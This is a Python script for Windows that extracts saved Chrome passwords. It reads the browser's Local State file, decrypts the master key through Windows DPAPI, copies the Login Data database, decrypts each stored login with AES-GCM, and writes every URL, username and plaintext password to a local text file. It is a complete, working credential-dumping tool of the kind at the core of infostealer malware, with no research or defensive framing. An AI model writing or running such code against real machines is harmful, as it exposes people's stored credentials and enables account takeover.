import os
import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES
import win32crypt  # Requires pywin32 for Windows decryption
import sys

def get_chrome_encryption_key():
    # Path to the Chrome Local State file
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = file.read()
        local_state = json.loads(local_state)

    # Base64 decode the encrypted key
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])

    # Remove DPAPI prefix and decrypt the key using CryptUnprotectData
    encrypted_key = encrypted_key[5:]  # Remove the "DPAPI" prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(encrypted_password, key):
    try:
        # Chrome uses AES in GCM mode for encryption
        # The encrypted password has a prefix "v10" indicating AES-GCM encryption
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)[:-16].decode()  # Remove GCM tag
        return decrypted_password
    except Exception as e:
        return None

def save_passwords_to_file(passwords, filename="chrome_passwords.txt"):
    with open(filename, "w", encoding="utf-8") as f:
        for entry in passwords:
            f.write(f"URL: {entry['url']}\n")
            f.write(f"Email: {entry['email']}\n")
            f.write(f"Password: {entry['password']}\n")
            f.write("="*40 + "\n")
    print(f"Passwords saved to {filename}")

def get_chrome_passwords():
    passwords = []
    key = get_chrome_encryption_key()

    # Path to the Chrome Login Data database
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\default\Login Data')
    # Make a copy of the database as Chrome locks it during operation
    db_copy = os.path.join(os.environ['USERPROFILE'], 'LoginDataCopy.db')
    shutil.copyfile(db_path, db_copy)

    # Connect to the copied database
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()

    # Query for fetching email and password details
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        url = row[0]
        email = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        if decrypted_password:
            passwords.append({
                "url": url,
                "email": email,
                "password": decrypted_password
            })

    cursor.close()
    conn.close()

    # Delete the copied database after use
    os.remove(db_copy)

    return passwords

if __name__ == '__main__':
    try:
        passwords = get_chrome_passwords()
        save_passwords_to_file(passwords)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)
